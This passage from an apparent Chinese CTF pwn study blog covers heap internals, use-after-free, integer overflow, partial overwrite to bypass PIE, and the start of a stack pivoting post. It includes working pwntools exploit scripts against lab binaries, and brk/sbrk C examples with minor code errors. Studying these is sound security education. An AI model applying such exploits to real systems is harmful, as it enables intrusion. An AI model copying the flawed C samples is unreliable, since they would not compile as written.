python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletenote</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">magic=<span class="number">0x08048986</span></span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">addnote(<span class="number">32</span>,<span class="string">&quot;ddaa&quot;</span>)</span><br><span class="line">deletenote(<span class="number">0</span>)</span><br><span class="line">deletenote(<span class="number">1</span>)</span><br><span class="line">addnote(<span class="number">8</span>,p32(magic))</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Use After Free </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆中的off-by-one</title>
      <link href="/2024/09/28/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/"/>
      <url>/2024/09/28/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p>off-by-one 是一种特殊的漏洞利用，实质上是缓冲区溢出，但是只溢出一个字节，虽然不足以让我们像之前那样构造payload，但依旧可以加以利用。</p>]]></content>
      
      
      <categories>
          
          <category> Heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> off-by-one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 16.04 下安装VMware Tools</title>
      <link href="/2024/08/16/Ubuntu%2016.04%20%E4%B8%8B%E5%AE%89%E8%A3%85VMware%20Tools/"/>
      <url>/2024/08/16/Ubuntu%2016.04%20%E4%B8%8B%E5%AE%89%E8%A3%85VMware%20Tools/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get upgrate</span><br><span class="line"><span class="built_in">sudo</span> apt-get install open-vm-tools-desktop -y</span><br><span class="line"><span class="built_in">sudo</span> reboot</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> VMware Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用echo命令输出flag</title>
      <link href="/2024/08/15/%E4%BD%BF%E7%94%A8echo%E5%91%BD%E4%BB%A4%E8%BE%93%E5%87%BAflag/"/>
      <url>/2024/08/15/%E4%BD%BF%E7%94%A8echo%E5%91%BD%E4%BB%A4%E8%BE%93%E5%87%BAflag/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p>在获取shell后，有的时候会发现&#x2F;bin&#x2F;sh目录下只有echo命令(无法使用ls cat之类)，这个时候可以使用如下命令输出flag文件的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(&lt;fileName)</span>&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> echo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整数溢出</title>
      <link href="/2024/08/13/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/"/>
      <url>/2024/08/13/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>先看c语言常见数据类型及其范围<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-13%20163220.png" alt="1"><br><em>因为数据类型的大小范围是编译器决定的</em></p><p>当程序中的数据超过其数据类型的范围时，会造成数据溢出，其中整数类型的溢出称为整数溢出<br>以32位为例<br>无符号上溢：无符号数 0xffffffff 加 1 会变成 0。<br>无符号下溢：无符号数 0 减去 1 会变成 0xffffffff,即-1。<br>有符号上溢：有符号正数 0x7fffffff 加 1 变成 0x80000000, 即从 2147483647 变成了-2147483648。<br>有符号下溢：有符号负数 0x80000000 减去 1 变成 0x7fffffff,即从-2147483648 变成了 2147483647。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/intoverflow">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/intoverflow</a></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-13%20164010.png" alt="1"></p><p>其中v3为unsigned int8，范围为0到255（0xff），存在整数溢出，同时strcpy(dest, s)存在栈溢出风险，也存在后门函数<br>思路：利用整数溢出绕过对v3的检查（使payload长度为260到264），再构造栈溢出ret到后门函数，获取flag</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./intoverflow&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">backdoor=<span class="number">0x08048694</span></span><br><span class="line">payload=cyclic(<span class="number">0x14</span>+<span class="number">4</span>)+p32(backdoor)+cyclic(<span class="number">236</span>) <span class="comment">#payload长度为264，整数溢出后对应8</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 整数溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆相关</title>
      <link href="/2024/08/08/%E5%A0%86%E7%9B%B8%E5%85%B3/"/>
      <url>/2024/08/08/%E5%A0%86%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><p><img src="https://gateway.pinata.cloud/ipfs/bafkreibceromkvwouskhvxcvhbmiut75yhftpwm7xhty5j7ruwqbngfeuu" alt="0"></p><h2 id="堆块大小"><a href="#堆块大小" class="headerlink" title="堆块大小"></a>堆块大小</h2><p>chunk的大小(至少)都是8字节对齐，所以mchunk_ size的 低3位固定为0 (8D&#x3D; 1000B)。为了充分利用内存空间，mchunk_ size的低3位分别存储PREV_ INUS、IS_MMAPPED、NON_MAIN_ARENA信息。NON_MAIN_ARENA用来记录当前chunk是否不属于主线程，1表示不属于，0表示属于。IS_ MAPPED用来记录当前chunk是否是由mmap分配的。 PRE_INUSE用来记录前个chunk块是否被分配， 如果与当前chunk向 上相邻的chunk为被释放的状 态，则PREV_ INUSE标志位为0。</p><p>32位：<br>用户分配到的最小堆块是17B:  pre_size(4B) + size(4B) + fd(4B) + bk(4B) + pre_inuse (1B)<br>若用户申请的大小超过最小堆块大小，会与8B对齐（2<em>size_sz）<br>64位：<br>用户分配到的最小堆块是33B:  pre_size(8B) + size(8B) + fd(8B) + bk(8B) + pre_inuse (1B)<br>若用户申请的大小超过最小堆块大小，会与16B对齐（2</em>size_sz）</p><p><em>size_sz 32位为4B，64位为8B</em></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-28%20162639.png" alt="1"></p><h2 id="空间复用"><a href="#空间复用" class="headerlink" title="空间复用"></a>空间复用</h2><p>当一个chunk正在使用中，其下一个chunk的pre_size无效，可以被当前chunk使用</p><h2 id="ida中常见指针形式"><a href="#ida中常见指针形式" class="headerlink" title="ida中常见指针形式"></a>ida中常见指针形式</h2><p>*(point) &lt;&#x3D;&#x3D;&gt; [point]   伪代码&lt;&#x3D;&#x3D;&gt;汇编 </p><h2 id="堆申请内存本质"><a href="#堆申请内存本质" class="headerlink" title="堆申请内存本质"></a>堆申请内存本质</h2><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-08%20102915.png" alt="1"></p><h2 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h2><p>调用free函数后程序做了两件事：<br>1.清空此堆块的user data<br>2.将指向此堆块的指针存储到main arena中（或是fast bin中）</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>·与<strong>内存回收</strong>相关的概念，用户free掉的chunk并不是直接归还给操作系统，而是交由堆管理器（这里先谈ptmalloc）来管理，从而避免多次进行系统调用浪费大量资源<br>·ptmalloc将相似大小的chunk用双向链表连接起来，这样的一个链表被称为bin<br>·ptmalloc一共维护了128个bin，并使用一个数组来存储这些bin，如图<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-08%20105000.png" alt="1"><br>·堆管理器根据特点，将bin分为四类： fast bin | unsorted bin | small bin | large bin<br>·数组中 bin1 为 unsorted bin；bin2到63 为small bin；bin64到126为large bin</p><h2 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h2><p>包含chunk大小：16B 24B … 80B<br>fast bin只使用了fd，为<strong>单链表</strong>结构<br>fast bin 不会主动进行合并<br>fastbinY为管理fast bin的数组，每个成员分别管理不同大小的fast bin<br>当用户申请大小小于或等于 fastbin_MAXSIZE时，优先从fast bin 中找，遵循<strong>LIFO</strong></p><h2 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h2><p>当用户申请大小大于 fastbin_MAXSIZE时，考虑small bin<br>small bin 为<strong>双链表</strong>结构，<strong>FIFO</strong><br>当满足small bin条件的chunk被free后，会优先放入unsorted bin，在一定情况下才会分配到small bin<br>相邻free chunk会合并</p><h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><p><strong>双链表</strong>结构，对chunk大小没有限制<br>当fast bin 和 small bin 中的chunk都不满足要求时，会优先考虑unsorted bin，它会在分配large bin之前对堆中的碎片chunk进行合并，以减少堆中的碎片</p><h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</p><p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p><p><em>初始情况下，我们可以将 unsorted chunk 作为 top chunk。</em></p><h2 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h2><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为 last remainder</p><hr><p><strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong> ，故上面的内存分配的是虚拟内存</p><p><em>ptmalloc2主要通过malloc和free来分配和释放内存块</em></p><h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>在 glibc 的 malloc.c 中，malloc 的说明如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">  malloc(size_t n)</span><br><span class="line">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span><br><span class="line">  if no space is available. Additionally, on failure, errno is</span><br><span class="line">  set to ENOMEM on ANSI C systems.</span><br><span class="line">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span><br><span class="line">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span><br><span class="line">  systems.)  On most systems, size_t is an unsigned type, so calls</span><br><span class="line">  with negative arguments are interpreted as requests for huge amounts</span><br><span class="line">  of space, which will often fail. The maximum supported value of n</span><br><span class="line">  differs across systems, but is in all cases less than the maximum</span><br><span class="line">  representable value of a size_t.</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>可以看到malloc返回对应大小的指针，同时对一些异常情况做了处理<br>1.n&#x3D;0时，返回当前系统允许的最小内存块<br>2.n＜0时，由于n为无符号整数，此时会申请一个很大的内存块，而一般没有这么大内存块可申请，会报错</p><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>在 glibc 的 malloc.c 中，free 的说明如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">    free(void* p)</span><br><span class="line">    Releases the chunk of memory pointed to by p, that had been previously</span><br><span class="line">    allocated using malloc or a related routine such as realloc.</span><br><span class="line">    It has no effect if p is null. It can have arbitrary (i.e., bad!)</span><br><span class="line">    effects if p has already been freed.</span><br><span class="line">    Unless disabled (using mallopt), freeing very large spaces will</span><br><span class="line">    when possible, automatically trigger operations that give</span><br><span class="line">    back unused memory to the system, thus reducing program footprint.</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>可以看出,free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。<br>同样对一些异常情况做了处理<br>1.当 p 为空指针时，函数不执行任何操作。<br>2.当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 double free。<br>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</p><h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2><p>操作系统提供brk，glibc库提供sbrk，我们可以通过增加 brk 的大小来向操作系统申请内存。<br>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同<br>1.不开启 ASLR 保护时，start_brk 以及 brk 会指向 data&#x2F;bss 段的结尾。<br>2.开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的随机偏移处</p><p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用</p><h2 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h2><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p><h2 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h2><p>虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为 <strong>main_arena</strong>。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p><p>在主线程释放内存后，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p><h2 id="brk-sbrk函数-（摘自评论区-作者：载酒）"><a href="#brk-sbrk函数-（摘自评论区-作者：载酒）" class="headerlink" title="brk&amp;sbrk函数 （摘自评论区 作者：载酒）"></a>brk&amp;sbrk函数 （摘自评论区 作者：载酒）</h2><p>【定义】<br>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，brk是系统调用 而sbrk不是  ，sbrk调用了brk<br>内核维护一个进程控制块（PCB），该结构体中维护两个指针：start_brk和brk，他们分别表示堆块的开始地址和结束地址<br>【函数使用】<br>sbrk函数<br>定义：传参0时可以获取当前brk指针的值，传参num时可以将当前brk指针的值增加拓展num字节(传参整数是增加，传参负数是减少)<br>返回值：若成功，brk()会返回0，否则返回-1。<br>brk函数<br>定义：可以改变brk指针内存储的地址（即堆结束地址，又叫堆顶），传参多少就把brk设置为多少<br>返回值：若成功，brk()会返回0，否则返回-1。<br>示例<br>同样是将堆地址拓展4096字节，有以下两种写法<br>● 1、使用sbrk函数进行拓展</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span> original_brk = (<span class="type">void</span>*)sbrk(<span class="number">0</span>); <span class="comment">//获取当前堆顶地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Original break: %p\n&quot;</span>,original_brk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(sbrk(<span class="number">4096</span>) != (<span class="type">void</span>*)<span class="number">-1</span>)&#123; <span class="comment">//扩展堆顶地址4096字节</span></span><br><span class="line">        <span class="type">void</span>* updated_brk = (<span class="type">void</span>*)sbrk(<span class="number">0</span>); <span class="comment">//获取更新过后的堆顶地址</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;updated break: %p\n&quot;</span>,updated_brk);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to update break\n&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、使用brk函数进行拓展</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">void</span> new_brk = (<span class="type">void</span>*)sbrk(<span class="number">0</span>); <span class="comment">//获取当前堆顶地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Original break: %p\n&quot;</span>,new_brk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(brk(new_brk+<span class="number">4096</span>)==<span class="number">0</span>)&#123; <span class="comment">//扩展堆顶地址4096字节</span></span><br><span class="line">        <span class="type">void</span>* updated_brk = (<span class="type">void</span>*)sbrk(<span class="number">0</span>); <span class="comment">//获取更新过后的堆顶地址</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;updated break: %p\n&quot;</span>,updated_brk);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to update break\n&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Heap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈上的partial overwrite（绕过pie）</title>
      <link href="/2024/08/05/%E6%A0%88%E4%B8%8A%E7%9A%84partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87pie%EF%BC%89/"/>
      <url>/2024/08/05/%E6%A0%88%E4%B8%8A%E7%9A%84partial%20overwrite%EF%BC%88%E7%BB%95%E8%BF%87pie%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们知道, 在开启了随机化（ASLR，PIE）后, 无论高位的地址如何变化，低 12 位的页内偏移始终是固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>2018 - 安恒杯 - babypie <a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/babypie">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/babypie</a></p><p>可以看到保护全开（除了relro半开）<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20184649.png" alt="1"><br>ida查看，发现有两次栈溢出，且有后门函数<br><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20184829.png" alt="1"><br>在第一次 read 之后紧接着就有一个输出, 而 read 并不会给输入的末尾加上 \0, 这就给了我们 leak 栈上内容的机会。我们利用第一次read泄露canary<br>而返回地址与 get shell 函数的地址只有低位的 16 bit 不同,而返回地址低两位字节中只有4 bit是无法控制的，如果覆写低 16 bit 为 0x?A3F, 就有一定的几率 get shell<br>所以考虑低位爆破后门函数的地址</p><p><em>canary为了防止被泄露，最低字节固定为\x00，所以我们可以覆盖这个字节来达到泄露的目的</em></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#  context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./babypie&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  泄露canary</span></span><br><span class="line">        io.sendafter(<span class="string">&quot;:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        canary = <span class="string">&#x27;\0&#x27;</span> + io.recvn(<span class="number">7</span>)</span><br><span class="line">        success(canary.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  gdb.attach(io)</span></span><br><span class="line">        io.sendafter(<span class="string">&quot;:\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span>) + canary + <span class="string">&#x27;bbbbbbbb&#x27;</span> + <span class="string">&#x27;\x3f\x0A&#x27;</span>) <span class="comment">#考虑栈对齐</span></span><br><span class="line">        </span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="built_in">print</span> e</span><br></pre></td></tr></table></figure><p><em>这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段</em></p>]]></content>
      
      
      <categories>
          
          <category> Stack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> partial overwrite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack pivoting(栈翻转)</title>
      <link href="/2024/08/05/Stack%20pivoting(%E6%A0%88%E7%BF%BB%E8%BD%AC)/"/>
      <url>/2024/08/05/Stack%20pivoting(%E6%A0%88%E7%BF%BB%E8%BD%AC)/</url>
      
        <content type="html"><![CDATA[<p><em>仅供个人学习参考</em>  </p><span id="more"></span><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如其名，劫持栈指针指向攻击者能够控制的内存，再进行rop</p><p>利用情况：<br>1.可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链<br>2.开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。<br>3.其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</p><p>利用条件：<br>1.可以控制程序执行流。<br>2.可以控制 sp 指针。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>X-CTF Quals 2016 - b0verfl0w <a href="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/b0verfl0w">https://raw.githubusercontent.com/GNchen1/Pages/main/Img/b0verfl0w</a></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20172429.png" alt="1"></p><p><img src="https://raw.githubusercontent.com/GNchen1/Pages/main/Img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-08-05%20172349.png" alt="1"></p><p>存在栈溢出，但溢出后可供写入的字节数很少，考虑Stack 